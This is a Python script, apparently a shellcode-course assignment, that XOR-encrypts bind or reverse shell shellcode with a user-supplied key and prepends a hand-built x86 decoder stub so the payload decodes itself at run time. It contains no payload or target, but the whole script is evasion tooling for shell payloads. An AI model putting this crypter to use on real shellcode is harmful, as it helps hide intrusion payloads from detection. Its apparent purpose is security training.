import argparse

parser = argparse.ArgumentParser(description="Crypter SLAE assignment 4")
parser.add_argument('-s', '--shellcode', help='bind or reverse', dest='shellcode')
parser.add_argument('-k', '--key', help='2 Byte Key to crypt or decrypt', dest='key')
parser.add_argument('-a', '--address', help='startadress for decoder', dest='start_address')
results = parser.parse_args()

encrypted_code = []
key = results.key.replace('\\x', '0x')
plain_code = results.shellcode.split('\\x')
del plain_code[0]



for counter in range(0, len(plain_code)):
    plain_code[counter] = "0x" + plain_code[counter]
    encrypt_hex = hex(int(plain_code[counter], 16) ^ int(key, 16))
    if len(encrypt_hex) == 3:
        encrypt_hex = encrypt_hex[0:2] + "0" + encrypt_hex[2:]
    encrypted_code.append(encrypt_hex)


encrypted_shellcode = "".join(encrypted_code).replace('0x', '\\x')
startaddress = "0x" + results.start_address
startaddress_int = int(startaddress, 16)+0x10
endaddress_int = int(startaddress, 16)+0x0f+len(plain_code)

startaddress = startaddress_int.to_bytes(4, 'little').hex()
endaddress = endaddress_int.to_bytes(4, 'little').hex()

startaddress_shellcode = "\\x" + "\\x".join(startaddress[i-1:i+1] for i,c in enumerate(startaddress) if i%2)
endaddress_shellcode = "\\x" + "\\x".join(endaddress[i-1:i+1] for i,c in enumerate(endaddress) if i%2)

key = key.replace('0x', '\\x')
decoder = "\\xb8{}\\x80\\x30{}\\x40\\x3d{}\\x7e\\xf5".format(startaddress_shellcode, key, endaddress_shellcode)

print("plain:       '{}'".format(results.shellcode))
print("encrypted:   '{}'".format(encrypted_shellcode))
print("key:         '{}'".format(key))
print("shellscript: '{}'".format(decoder+encrypted_shellcode))











